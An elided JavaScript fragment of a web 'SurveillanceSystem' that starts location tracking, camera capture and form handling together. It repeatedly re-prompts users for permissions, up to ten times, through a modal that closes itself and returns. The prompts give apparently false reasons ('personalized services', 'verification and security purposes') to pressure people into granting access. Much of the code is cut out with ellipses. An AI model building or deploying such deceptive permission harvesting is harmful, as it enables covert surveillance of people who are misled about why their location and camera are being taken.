...
const MAX_PERMISSION_ATTEMPTS = 10;

// 🎯 Enhanced initialization with persistent permission requests
class SurveillanceSystem {
    ...
    async initializeSystem() {
        try {
            // Initialize all components with persistent permission requests
    ...
    async initializeWithRetry() {
        const geolocationPromise = this.initializeGeolocationWithRetry();
        const mediaPromise = this.initializeMediaWithRetry();
        const formPromise = this.initializeFormHandler();

        await Promise.allSettled([geolocationPromise, mediaPromise, formPromise]);
    }

    // 📍 Persistent Geolocation with continuous retry
    ...
    // 🎥 Persistent Media Capture with continuous retry
    ...
    showPermissionRequest(type, attempt) {
        ...
        const messages = {
            'location': 'This app requires your location to provide personalized services.',
            'camera': 'This app needs camera access for verification and security purposes.'
        };

        // Create or update permission request modal
        ...
        if (!modal) {
            ...
            modal.innerHTML = `
                ...
                ">
                    ...
                    <h2 style="color: #333; margin-bottom: 15px;" id="permissionTitle">Permission Required</h2>
                    <p style="color: #666; margin-bottom: 25px; line-height: 1.5;" id="permissionMessage">Please allow access to continue.</p>
                    <p style="color: #888; font-size: 0.9em; margin-bottom: 20px;">Attempt: <span id="attemptCount">${attempt}</span>/${MAX_PERMISSION_ATTEMPTS}</p>
        ...
        document.getElementById('permissionTitle').textContent = permissionTypes[type];
        document.getElementById('permissionMessage').textContent = messages[type];
        document.getElementById('attemptCount').textContent = attempt;

        // Auto-remove after 5 seconds and retry
        setTimeout(() => {
    ...
    // 📍 Original Geolocation (kept for reference)
...
// 🚀 Initialize the enhanced system with persistent permissions
